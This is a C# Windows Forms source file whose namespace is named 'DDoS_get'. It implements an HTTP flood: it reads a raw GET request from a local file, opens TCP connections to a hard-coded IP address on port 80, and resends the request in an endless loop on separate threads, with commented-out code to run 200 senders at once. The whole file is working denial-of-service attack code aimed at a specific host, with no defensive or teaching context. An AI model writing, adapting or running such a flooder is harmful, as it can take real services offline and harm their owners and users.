using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;











namespace DDoS_get
{
    public partial class Form1 : Form
    {
        GetSender[] gs;
        System.IO.StreamReader sr;
        public Form1()
        {
            InitializeComponent();
            sr = new System.IO.StreamReader("d:/output/http.txt");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            gs = new GetSender[200];string get =  this.sr.ReadToEnd(); gs[0] = new GetSender(IPAddress.Parse("120.102.225.12"), 80, get , true);
//            for (int i = 0; i != 200;)
//            {
               
////this.sr.ReadToEnd()
//                //if (i == 0)
//                //{
                   
//                //}
//                //else
//                {
//                    gs[i++] = new GetSender(IPAddress.Parse("120.102.225.12"), 80,get , false);

//                }
//            }
        }
    }
    class GetSender
    {
        bool important;
        static string get;//......
        TcpClient c;
        NetworkStream nws;
        Thread t;
        public GetSender(IPAddress ip, int port, string getStr , bool show)
        {
            c = new TcpClient(ip.ToString(), port);
            nws = c.GetStream();
            get =  getStr;
            //listen();
            important = show;  
            t = new Thread(new ThreadStart(listen)); t.Start();
        }
        void listen()
        {
            
        restart:
            nws.Write(Encoding.ASCII.GetBytes(get), 0, Encoding.ASCII.GetByteCount(get));
            byte[] bfr = new byte[10 ];//"fsadfs"
            nws.Read(bfr, 0, 10 );
            //if (important)
            //{ }
               Console.WriteLine  (Encoding.ASCII.GetString(bfr));
            

            //





            goto restart;
        }














    }
}
